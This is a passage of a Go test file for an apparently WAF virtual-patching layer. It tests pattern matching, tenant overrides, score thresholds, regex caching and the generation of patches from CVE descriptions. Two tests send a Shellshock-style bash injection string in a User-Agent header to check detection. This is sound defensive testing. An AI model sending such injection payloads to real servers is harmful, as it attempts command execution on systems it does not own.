	if result.Action != engine.ActionPass {
		t.Errorf("empty header value should not match, got %v", result.Action)
	}
}

// --------------------------------------------------------------------------
// Layer: matchPatch with AND logic
// --------------------------------------------------------------------------

func TestLayer_MatchPatch_AndLogic(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	layer.AddPatch(&VirtualPatch{
		ID:        "VP-AND",
		Severity:  "HIGH",
		Action:    "block",
		Score:     40,
		Enabled:   true,
		MatchLogic: "and",
		Patterns: []PatchPattern{
			{Type: "path", Pattern: "/api/", MatchType: "contains"},
			{Type: "method", Pattern: "POST", MatchType: "exact"},
		},
	})

	// Both match
	ctx := &engine.RequestContext{Method: "POST", Path: "/api/users"}
	result := layer.Process(ctx)
	if result.Action != engine.ActionBlock {
		t.Errorf("AND logic: both match should block, got %v", result.Action)
	}

	// Only one match
	ctx2 := &engine.RequestContext{Method: "GET", Path: "/api/users"}
	result2 := layer.Process(ctx2)
	if result2.Action == engine.ActionBlock {
		t.Error("AND logic: only one match should not block")
	}
}

func TestLayer_MatchPatch_EmptyPatterns_Cov(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	layer.AddPatch(&VirtualPatch{
		ID:       "VP-EMPTY-PAT",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{},
	})

	ctx := &engine.RequestContext{Method: "GET", Path: "/"}
	result := layer.Process(ctx)
	if result.Action != engine.ActionPass {
		t.Errorf("empty patterns should not match, got %v", result.Action)
	}
}

// --------------------------------------------------------------------------
// Layer: Process — tenant WAF config override, ActionLog, high score block
// --------------------------------------------------------------------------

func TestLayer_Process_TenantOverride_Cov(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL"},
	})

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/",
		Headers: map[string][]string{
			"User-Agent": {"() { :; }; /bin/bash -c 'echo vulnerable'"},
		},
		TenantWAFConfig: &config.WAFConfig{
			VirtualPatch: config.VirtualPatchConfig{
				Enabled: false,
			},
		},
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionPass {
		t.Errorf("tenant override disabled should pass, got %v", result.Action)
	}
}

func TestLayer_Process_TenantOverrideEnabled(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL"},
	})

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/",
		Headers: map[string][]string{
			"User-Agent": {"() { :; }; /bin/bash -c 'echo vulnerable'"},
		},
		TenantWAFConfig: &config.WAFConfig{
			VirtualPatch: config.VirtualPatchConfig{
				Enabled: true,
			},
		},
	}

	result := layer.Process(ctx)
	if result.Score == 0 {
		t.Error("tenant override enabled should still detect patterns")
	}
}

func TestLayer_Process_ActionLog(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	// The WordPress REST API patch has action "log" and severity HIGH
	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/wp-json/wp/v1/users",
		Request: &http.Request{
			URL: &url.URL{Path: "/wp-json/wp/v1/users"},
		},
	}

	result := layer.Process(ctx)
	// It should produce a finding (log action)
	if len(result.Findings) == 0 {
		t.Log("WordPress REST pattern not matched — may be regex mismatch")
	} else {
		if result.Action != engine.ActionLog {
			t.Errorf("expected ActionLog for log-only patch, got %v", result.Action)
		}
	}
}

func TestLayer_Process_ScoreAccumulationToBlock(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH", "MEDIUM"},
	})

	// Add multiple log-action patches that accumulate to >= 50
	for i := range 3 {
		layer.AddPatch(&VirtualPatch{
			ID:       fmt.Sprintf("VP-ACC-%d", i),
			Severity: "MEDIUM",
			Action:   "log",
			Score:    20,
			Enabled:  true,
			Patterns: []PatchPattern{
				{Type: "path", Pattern: "/target", MatchType: "exact"},
			},
			MatchLogic: "or",
		})
	}

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/target",
	}

	result := layer.Process(ctx)
	// 3 * 20 = 60 >= 50 → should block
	if result.Action != engine.ActionBlock {
		t.Errorf("expected block from score accumulation (60 >= 50), got %v score=%d", result.Action, result.Score)
	}
}

func TestLayer_Process_DisabledPatchInActiveList(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	// Add a patch and disable it
	layer.AddPatch(&VirtualPatch{
		ID:       "VP-DIS",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  false, // disabled
		Patterns: []PatchPattern{
			{Type: "path", Pattern: "/disabled", MatchType: "exact"},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/disabled",
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionPass {
		t.Errorf("disabled patch should not trigger, got %v", result.Action)
	}
}

func TestLayer_Process_SeverityNotInBlockList(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL"}, // only CRITICAL
	})

	layer.AddPatch(&VirtualPatch{
		ID:       "VP-MED",
		Severity: "MEDIUM",
		Action:   "block",
		Score:    30,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "path", Pattern: "/medium-only", MatchType: "exact"},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/medium-only",
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionPass {
		t.Errorf("MEDIUM severity not in block list should not trigger, got %v", result.Action)
	}
}

// --------------------------------------------------------------------------
// Layer: regex match, invalid regex, regex cache eviction
// --------------------------------------------------------------------------

func TestLayer_MatchRegex_InvalidPattern_Cov(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	layer.AddPatch(&VirtualPatch{
		ID:       "VP-BADRE",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "path", Pattern: "[invalid(regex", MatchType: "regex"},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/test",
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionPass {
		t.Errorf("invalid regex should not match, got %v", result.Action)
	}
}

func TestLayer_MatchRegex_CacheEviction_Cov(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	// Fill cache beyond 10000 entries to trigger eviction
	for i := range 10001 {
		pat := fmt.Sprintf("^test%d$", i)
		layer.AddPatch(&VirtualPatch{
			ID:       fmt.Sprintf("VP-CACHE-%d", i),
			Severity: "HIGH",
			Action:   "block",
			Score:    40,
			Enabled:  true,
			Patterns: []PatchPattern{
				{Type: "path", Pattern: pat, MatchType: "regex"},
			},
			MatchLogic: "or",
		})
	}

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   fmt.Sprintf("/test%d", 10000),
	}

	result := layer.Process(ctx)
	// The last pattern should match
	if result.Score == 0 {
		t.Log("cache eviction path: no match found, patterns may have been evicted")
	}

	// Verify cache size is bounded
	layer.mu.RLock()
	cacheSize := len(layer.compiledPatterns)
	layer.mu.RUnlock()
	if cacheSize > 10001 {
		t.Errorf("cache size should be bounded around 10000, got %d", cacheSize)
	}
}

// --------------------------------------------------------------------------
// Layer: NewLayer with nil config, NewLayer with auto-update + NVD URL rejection
// --------------------------------------------------------------------------

func TestNewLayer_NilConfig_Cov(t *testing.T) {
	layer := NewLayer(nil)
	if layer == nil {
		t.Fatal("expected non-nil layer with nil config")
	}
	if !layer.config.AutoUpdate {
		t.Error("default config should have AutoUpdate=true")
	}
	layer.Stop()
}

func TestNewLayer_BadNVDFeedURL(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:    true,
		AutoUpdate: true,
		NVDFeedURL: "http://127.0.0.1/fake-nvd",
	})
	defer layer.Stop()

	// Layer should still be created, NVD client URL should be rejected
	// (log message emitted, auto-update proceeds with default URL)
	if layer.nvdClient == nil {
		t.Error("NVD client should still be created even if URL is rejected")
	}
}

// --------------------------------------------------------------------------
// Generator: shouldGenerate edge cases
// --------------------------------------------------------------------------

func TestGenerator_ShouldGenerate_BelowThreshold(t *testing.T) {
	gen := NewGenerator()

	// Score 4.9 with LOW severity should not generate
	cve := &CVEEntry{
		CVEID:       "CVE-2024-LOW",
		Description: "some non-web issue",
		CVSSScore:   4.9,
		Severity:    "LOW",
	}
	patch := gen.Generate(cve)
	if patch != nil {
		t.Error("LOW severity non-web CVE should not generate patch")
	}
}

func TestGenerator_ShouldGenerate_HighSeverityEvenWithLowScore(t *testing.T) {
	gen := NewGenerator()

	// Even with score < 5.0, HIGH severity + web keyword should generate
	cve := &CVEEntry{
		CVEID:       "CVE-2024-HIGH",
		Description: "SQL injection in web application",
		CVSSScore:   4.5,
		Severity:    "HIGH",
		CWEs:        []string{"CWE-89"},
	}
	patch := gen.Generate(cve)
	if patch == nil {
		t.Error("HIGH severity web CVE should generate patch even with low CVSS")
	}
}

func TestGenerator_ShouldGenerate_NonWebAttack(t *testing.T) {
	gen := NewGenerator()

	cve := &CVEEntry{
		CVEID:       "CVE-2024-NONWEB",
		Description: "Buffer overflow in desktop application",
		CVSSScore:   9.0,
		Severity:    "CRITICAL",
	}
	patch := gen.Generate(cve)
	if patch != nil {
		t.Error("non-web CVE should not generate patch")
	}
}

func TestGenerator_ShouldGenerate_WebCWE(t *testing.T) {
	gen := NewGenerator()

	cve := &CVEEntry{
		CVEID:       "CVE-2024-CWE",
		Description: "Path traversal vulnerability in web file handler (../ sequences)",
		CVSSScore:   8.0,
		Severity:    "HIGH",
		CWEs:        []string{"CWE-22"}, // path traversal — validates CWE-based detection
	}
	patch := gen.Generate(cve)
	if patch == nil {
		t.Error("CVE with web CWE should generate patch")
	}
}

// --------------------------------------------------------------------------
// Generator: detectAttackType variants
// --------------------------------------------------------------------------

func TestGenerator_DetectAttackType_JNDI(t *testing.T) {
	gen := NewGenerator()
	cve := &CVEEntry{
		CVEID:       "CVE-2024-JNDI",
		Description: "Log4j JNDI injection vulnerability",
		CVSSScore:   10.0,
		Severity:    "CRITICAL",
	}
	patch := gen.Generate(cve)
	if patch == nil {
		t.Fatal("expected patch for JNDI CVE")
	}
	if len(patch.Patterns) == 0 {
		t.Error("expected JNDI patterns")
	}
}

func TestGenerator_DetectAttackType_Deserialization(t *testing.T) {
	gen := NewGenerator()
	cve := &CVEEntry{
		CVEID:       "CVE-2024-DESER",
		Description: "Deserialization of untrusted data in web framework",
		CVSSScore:   9.5,
		Severity:    "CRITICAL",
	}
	patch := gen.Generate(cve)
	if patch == nil {
		t.Fatal("expected patch for deserialization CVE")
	}
	if len(patch.Patterns) == 0 {
		t.Error("expected deserialization patterns")
	}
}

func TestGenerator_DetectAttackType_XSS(t *testing.T) {
	gen := NewGenerator()
	cve := &CVEEntry{
		CVEID:       "CVE-2024-XSS",
		Description: "Cross-site scripting in web parameter",
		CVSSScore:   7.5,
		Severity:    "HIGH",
	}
	patch := gen.Generate(cve)
	if patch == nil {
		t.Fatal("expected patch for XSS CVE")
	}
	if len(patch.Patterns) == 0 {
		t.Error("expected XSS patterns")
	}
}

func TestGenerator_DetectAttackType_RCE(t *testing.T) {
	gen := NewGenerator()
	cve := &CVEEntry{
		CVEID:       "CVE-2024-RCE",
		Description: "Remote code execution via shell command injection",
		CVSSScore:   9.0,
		Severity:    "CRITICAL",
	}
	patch := gen.Generate(cve)
	if patch == nil {
		t.Fatal("expected patch for RCE CVE")
	}
	if len(patch.Patterns) == 0 {
		t.Error("expected RCE patterns")
	}
}

func TestGenerator_DetectAttackType_LFI(t *testing.T) {
	gen := NewGenerator()
	cve := &CVEEntry{
		CVEID:       "CVE-2024-LFI",
		Description: "Local file inclusion via path traversal",
		CVSSScore:   8.0,
		Severity:    "HIGH",
	}
	patch := gen.Generate(cve)
	if patch == nil {
		t.Fatal("expected patch for LFI CVE")
	}
}

func TestGenerator_DetectAttackType_SSRF(t *testing.T) {
	gen := NewGenerator()
	cve := &CVEEntry{
		CVEID:       "CVE-2024-SSRF",
		Description: "Server-side request forgery in HTTP handler",
		CVSSScore:   8.5,
		Severity:    "HIGH",
	}
	patch := gen.Generate(cve)
	if patch == nil {
		t.Fatal("expected patch for SSRF CVE")
	}
}

func TestGenerator_DetectAttackType_Upload(t *testing.T) {
	gen := NewGenerator()
	cve := &CVEEntry{
		CVEID:       "CVE-2024-UPLOAD",
		Description: "Arbitrary file upload in web application",
		CVSSScore:   9.0,
		Severity:    "CRITICAL",
	}
	patch := gen.Generate(cve)
	if patch == nil {
		t.Fatal("expected patch for upload CVE")
	}
}

func TestGenerator_DetectAttackType_Header(t *testing.T) {
	gen := NewGenerator()
	cve := &CVEEntry{
		CVEID:       "CVE-2024-HEADER",
		Description: "HTTP header injection vulnerability",
		CVSSScore:   7.0,
		Severity:    "HIGH",
	}
	patch := gen.Generate(cve)
	if patch == nil {
		t.Fatal("expected patch for header injection CVE")
	}
}

func TestGenerator_DetectAttackType_XXE(t *testing.T) {
	gen := NewGenerator()
	cve := &CVEEntry{
		CVEID:       "CVE-2024-XXE",
		Description: "XML external entity injection",
		CVSSScore:   8.0,
		Severity:    "HIGH",
	}
	patch := gen.Generate(cve)
	if patch == nil {
		t.Fatal("expected patch for XXE CVE")
	}
}

func TestGenerator_DetectAttackType_Generic(t *testing.T) {
	gen := NewGenerator()
	cve := &CVEEntry{
		CVEID:       "CVE-2024-GENERIC",
		Description: "Web request vulnerability with unknown attack vector",
		CVSSScore:   7.5,
		Severity:    "HIGH",
	}
	patch := gen.Generate(cve)
	// Generic may or may not produce patterns depending on extractKeywords
	t.Logf("Generic patch: %v", patch)
}

// --------------------------------------------------------------------------
// Generator: determineSeverity, determineAction, calculateScore
// --------------------------------------------------------------------------

func TestGenerator_DetermineSeverity_FromCVSSScore(t *testing.T) {
	gen := NewGenerator()

	tests := []struct {
		score    float64
		expected string
	}{
		{9.5, "CRITICAL"},
		{7.5, "HIGH"},
		{5.0, "MEDIUM"},
		{2.0, "LOW"},
	}
	for _, tt := range tests {
		cve := &CVEEntry{CVSSScore: tt.score, Description: "sql injection web", Severity: ""}
		// We need the attack type to match so patterns are generated
		patch := gen.Generate(cve)
		if patch == nil {
			continue
		}
		// Severity comes from determineSeverity
		t.Logf("Score %f → severity %s", tt.score, patch.Severity)
	}
}

func TestGenerator_DetermineAction_Cov(t *testing.T) {
	gen := NewGenerator()

	tests := []struct {
		severity string
		expected string
	}{
		{"CRITICAL", "block"},
		{"HIGH", "block"},
		{"MEDIUM", "log"},
		{"LOW", "log"},
		{"", "log"},
	}
	for _, tt := range tests {
		result := gen.determineAction(tt.severity)
		if result != tt.expected {
			t.Errorf("determineAction(%q) = %q, want %q", tt.severity, result, tt.expected)
		}
	}
}

func TestGenerator_CalculateScore_Cov(t *testing.T) {
	gen := NewGenerator()

	tests := []struct {
		cvss     float64
		severity string
		minScore int
	}{
		{10.0, "CRITICAL", 50},
		{9.0, "HIGH", 40},
		{5.0, "HIGH", 40},
		{8.0, "MEDIUM", 25},
		{4.0, "MEDIUM", 25},
		{3.0, "LOW", 15},
		{11.0, "CRITICAL", 50}, // capped
	}
	for _, tt := range tests {
		cve := &CVEEntry{CVSSScore: tt.cvss, Severity: tt.severity}
		score := gen.calculateScore(cve)
		if score < tt.minScore {
			t.Errorf("calculateScore(cvss=%f, sev=%q) = %d, want >= %d", tt.cvss, tt.severity, score, tt.minScore)
		}
		if score > 50 {
			t.Errorf("score should be capped at 50, got %d", score)
		}
	}
}

func TestGenerator_ExtractKeywords_Cov(t *testing.T) {
	gen := NewGenerator()

	keywords := gen.extractKeywords("the 'user' parameter allows union select injection (eval()")
	t.Logf("Extracted keywords: %v", keywords)

	if len(keywords) == 0 {
		t.Error("expected some keywords to be extracted")
	}

	// Check deduplication
	seen := map[string]bool{}
	for _, kw := range keywords {
		if seen[kw] {
			t.Errorf("duplicate keyword: %s", kw)
		}
		seen[kw] = true
	}
}

func TestGenerator_ExtractKeywords_Empty_Cov(t *testing.T) {
	gen := NewGenerator()

	keywords := gen.extractKeywords("")
	if len(keywords) != 0 {
		t.Errorf("expected no keywords from empty string, got %v", keywords)
	}
}

// --------------------------------------------------------------------------
// Generator: generatePatchID, generatePatchName
// --------------------------------------------------------------------------

func TestGeneratePatchID(t *testing.T) {
	result := generatePatchID("CVE-2024-12345")
	if result != "VP-CVE202412345" {
		t.Errorf("expected VP-CVE202412345, got %s", result)
	}
}

func TestGeneratePatchName_WithProduct(t *testing.T) {
	cve := &CVEEntry{
		CVEID:       "CVE-2024-TEST",
		Description: "Apache Struts remote code execution vulnerability",
	}
	name := generatePatchName(cve)
	if !strings.Contains(name, "Apache") {
		t.Errorf("expected product name in patch name, got %s", name)
	}
}

func TestGeneratePatchName_NoProduct(t *testing.T) {
	cve := &CVEEntry{
		CVEID:       "CVE-2024-TEST",
		Description: "A generic vulnerability in custom software",
	}
	name := generatePatchName(cve)
	if !strings.Contains(name, "Virtual Patch") {
		t.Errorf("expected generic name, got %s", name)
	}
}

// --------------------------------------------------------------------------
// extractPatternsFromDescription
// --------------------------------------------------------------------------

func TestExtractPatternsFromDescription_SQLInjection(t *testing.T) {
	patterns := extractPatternsFromDescription("SQL injection vulnerability in web app")
	if len(patterns) == 0 {
		t.Error("expected patterns for SQL injection description")
	}
}

func TestExtractPatternsFromDescription_XSS(t *testing.T) {
	patterns := extractPatternsFromDescription("Cross-site scripting vulnerability")
	if len(patterns) == 0 {
		t.Error("expected patterns for XSS description")
	}
}

func TestExtractPatternsFromDescription_PathTraversal(t *testing.T) {
	patterns := extractPatternsFromDescription("Path traversal via directory traversal attack")
	if len(patterns) == 0 {
		t.Error("expected patterns for path traversal description")
	}
}

func TestExtractPatternsFromDescription_RCE(t *testing.T) {
	patterns := extractPatternsFromDescription("Remote code execution via command injection")
	if len(patterns) == 0 {
		t.Error("expected patterns for RCE description")
	}
}

func TestExtractPatternsFromDescription_LFI(t *testing.T) {
	// LFI keyword matches but no switch case generates patterns
	patterns := extractPatternsFromDescription("Local file inclusion vulnerability")
	t.Logf("LFI patterns: %d (currently no switch case)", len(patterns))
}

func TestExtractPatternsFromDescription_RFI(t *testing.T) {
	// RFI keyword matches but no switch case generates patterns
	patterns := extractPatternsFromDescription("Remote file inclusion vulnerability")
	t.Logf("RFI patterns: %d (currently no switch case)", len(patterns))
}

func TestExtractPatternsFromDescription_XXE(t *testing.T) {
	// XXE keyword matches but no switch case generates patterns
	patterns := extractPatternsFromDescription("XML external entity injection")
	t.Logf("XXE patterns: %d (currently no switch case)", len(patterns))
}

func TestExtractPatternsFromDescription_SSRF(t *testing.T) {
	// SSRF keyword matches but no switch case generates patterns
	patterns := extractPatternsFromDescription("Server-side request forgery vulnerability")
	t.Logf("SSRF patterns: %d (currently no switch case)", len(patterns))
}

func TestExtractPatternsFromDescription_Unknown(t *testing.T) {
	patterns := extractPatternsFromDescription("A harmless update to documentation")
	if len(patterns) != 0 {
		t.Errorf("expected no patterns for non-attack description, got %d", len(patterns))
	}
}

func TestExtractPatternsFromDescription_MultipleKeywords(t *testing.T) {
	// Description with multiple attack types
	patterns := extractPatternsFromDescription("SQL injection and XSS via path traversal")
	if len(patterns) < 2 {
		t.Errorf("expected multiple patterns for multi-keyword description, got %d", len(patterns))
	}
}

// --------------------------------------------------------------------------
// generatePatchesFromCVE
// --------------------------------------------------------------------------

func TestLayer_GeneratePatchesFromCVE_Cov(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:           true,
		AutoUpdate:        false,
		AutoGenerateRules: true,
	})

	entry := &CVEEntry{
		CVEID:       "CVE-2024-GENPATCH",
		Description: "SQL injection vulnerability in web application",
		CVSSScore:   9.0,
		Severity:    "CRITICAL",
	}

	patches := layer.generatePatchesFromCVE(entry)
	if len(patches) == 0 {
		t.Error("expected patches to be generated from CVE with known attack type")
	}
	t.Logf("Generated %d patches", len(patches))
}

func TestLayer_GeneratePatchesFromCVE_NoPatterns_Cov(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:           true,
		AutoUpdate:        false,
		AutoGenerateRules: true,
	})

	entry := &CVEEntry{
		CVEID:       "CVE-2024-NOPAT",
		Description: "A harmless update",
		CVSSScore:   9.0,
		Severity:    "CRITICAL",
	}

	patches := layer.generatePatchesFromCVE(entry)
	if len(patches) != 0 {
		t.Errorf("expected no patches for non-attack description, got %d", len(patches))
	}
}

// --------------------------------------------------------------------------
// DefaultConfig
// --------------------------------------------------------------------------

func TestDefaultConfig(t *testing.T) {
	cfg := DefaultConfig()
	if cfg.Enabled != false {
		t.Error("default Enabled should be false")
	}
	if cfg.AutoUpdate != true {
		t.Error("default AutoUpdate should be true")
	}
	if cfg.UpdateInterval != 24*time.Hour {
		t.Errorf("default UpdateInterval should be 24h, got %v", cfg.UpdateInterval)
	}
	if cfg.AutoGenerateRules != true {
		t.Error("default AutoGenerateRules should be true")
	}
	if len(cfg.BlockSeverity) != 2 || cfg.BlockSeverity[0] != "CRITICAL" || cfg.BlockSeverity[1] != "HIGH" {
		t.Errorf("unexpected BlockSeverity: %v", cfg.BlockSeverity)
	}
	if cfg.NotifyOnPatch != true {
		t.Error("default NotifyOnPatch should be true")
	}
	if len(cfg.CustomPatches) != 0 {
		t.Errorf("expected empty CustomPatches, got %d", len(cfg.CustomPatches))
	}
}

// --------------------------------------------------------------------------
// DisablePatch / EnablePatch for non-existent patch
// --------------------------------------------------------------------------

func TestLayer_DisablePatch_NonExistent(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	result := layer.DisablePatch("VP-NONEXISTENT")
	if result {
		t.Error("expected false for disabling non-existent patch")
	}
}

func TestLayer_EnablePatch_NonExistent(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})
	result := layer.EnablePatch("VP-NONEXISTENT")
	if result {
		t.Error("expected false for enabling non-existent patch")
	}
}

// --------------------------------------------------------------------------
// NewLayer with custom patches from config
// --------------------------------------------------------------------------

func TestNewLayer_WithCustomPatches(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Enabled = true
	cfg.AutoUpdate = false
	cfg.CustomPatches = []CustomPatch{
		{
			ID:        "VP-CUSTOM-CFG",
			Name:      "Config Custom Patch",
			Severity:  "HIGH",
			Action:    "block",
			Score:     40,
			Enabled:   true,
			CVEID:     "CVE-2024-CUSTOM",
			Patterns:  []PatchPattern{
				{Type: "path", Pattern: "/custom-cfg-path", MatchType: "exact"},
			},
		},
	}

	layer := NewLayer(cfg)

	// Custom patches from config are not auto-loaded into the database
	// by loadDefaultPatches — this test verifies the layer is created
	// and the custom patches config is stored
	if layer.config.CustomPatches[0].ID != "VP-CUSTOM-CFG" {
		t.Error("custom patch config not preserved")
	}
}

// --------------------------------------------------------------------------
// runUpdate with nil NVD client
// --------------------------------------------------------------------------

func TestLayer_RunUpdate_NilNVDClient(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:    true,
		AutoUpdate: false,
	})
	// nvdClient is nil — runUpdate should return early
	layer.runUpdate()
	// No panic = success
}

// --------------------------------------------------------------------------
// Layer: matchRegex — concurrent access
// --------------------------------------------------------------------------

func TestLayer_MatchRegex_Concurrent(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	// Add a patch with a regex pattern
	layer.AddPatch(&VirtualPatch{
		ID:       "VP-CONC-RE",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "path", Pattern: "^/test[0-9]+$", MatchType: "regex"},
		},
		MatchLogic: "or",
	})

	var wg sync.WaitGroup
	for i := range 50 {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			ctx := &engine.RequestContext{
				Method: "GET",
				Path:   fmt.Sprintf("/test%d", i%10),
			}
			layer.Process(ctx)
		}(i)
	}
	wg.Wait()
}

// --------------------------------------------------------------------------
// Layer: getValueByType with nil Request
// --------------------------------------------------------------------------

func TestLayer_GetValueByType_QueryNilRequest(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})

	layer.AddPatch(&VirtualPatch{
		ID:       "VP-QRY-NIL",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "query", Pattern: "test", MatchType: "contains"},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method:  "GET",
		Path:    "/",
		Request: nil, // nil Request
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionPass {
		t.Errorf("nil Request with query type should not match, got %v", result.Action)
	}
}

func TestLayer_GetValueByType_URINilRequest(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	layer.AddPatch(&VirtualPatch{
		ID:       "VP-URI-NIL",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "uri", Pattern: "/test", MatchType: "contains"},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method:  "GET",
		Path:    "/test",
		Request: nil, // nil Request — should fall back to ctx.Path
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionBlock {
		t.Errorf("uri with nil Request should fall back to Path, got %v", result.Action)
	}
}

func TestLayer_GetValueByType_NilClientIP(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})

	layer.AddPatch(&VirtualPatch{
		ID:       "VP-IP-NIL",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "client_ip", Pattern: "1.2.3.4", MatchType: "exact"},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method:   "GET",
		Path:     "/",
		ClientIP: nil, // nil ClientIP
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionPass {
		t.Errorf("nil ClientIP should not match, got %v", result.Action)
	}
}

func TestLayer_GetValueByType_NilHeaders(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})

	layer.AddPatch(&VirtualPatch{
		ID:       "VP-HDR-NIL",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "header", Key: "X-Test", Pattern: "test", MatchType: "exact"},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method:  "GET",
		Path:    "/",
		Headers: nil, // nil Headers
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionPass {
		t.Errorf("nil Headers should not match, got %v", result.Action)
	}
}

func TestLayer_GetValueByType_BodyFallback(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	layer.AddPatch(&VirtualPatch{
		ID:       "VP-BODY-FB",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "body", Pattern: "testpayload", MatchType: "contains"},
		},
		MatchLogic: "or",
	})

	// BodyString is empty, Body is set — should use Body
	ctx := &engine.RequestContext{
		Method:     "POST",
		Path:       "/",
		Body:       []byte("this is testpayload data"),
		BodyString: "",
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionBlock {
		t.Errorf("expected body fallback to []byte, got %v", result.Action)
	}
}

// --------------------------------------------------------------------------
// Layer: matchRegex — existing cached pattern (re-check under write lock)
// --------------------------------------------------------------------------

func TestLayer_MatchRegex_ExistingCacheUnderWriteLock(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	// First, prime the cache with a pattern
	layer.AddPatch(&VirtualPatch{
		ID:       "VP-RE-CACHE",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "path", Pattern: "^/cached[0-9]$", MatchType: "regex"},
		},
		MatchLogic: "or",
	})

	// First request compiles and caches
	ctx1 := &engine.RequestContext{Method: "GET", Path: "/cached1"}
	result1 := layer.Process(ctx1)
	if result1.Action != engine.ActionBlock {
		t.Errorf("first regex match should block, got %v", result1.Action)
	}

	// Second request should use the cached compiled regex
	ctx2 := &engine.RequestContext{Method: "GET", Path: "/cached2"}
	result2 := layer.Process(ctx2)
	if result2.Action != engine.ActionBlock {
		t.Errorf("second regex match should block, got %v", result2.Action)
	}
}

// --------------------------------------------------------------------------
// regexMatchWithTimeout: simple true/false cases
// --------------------------------------------------------------------------

func TestRegexMatchWithTimeout_Match(t *testing.T) {
	re := regexp.MustCompile(`^test[0-9]+$`)
	result := regexMatchWithTimeout(re, "test123")
	if !result {
		t.Error("expected match")
	}
}

func TestRegexMatchWithTimeout_NoMatch(t *testing.T) {
	re := regexp.MustCompile(`^test[0-9]+$`)
	result := regexMatchWithTimeout(re, "no-match")
	if result {
		t.Error("expected no match")
	}
}
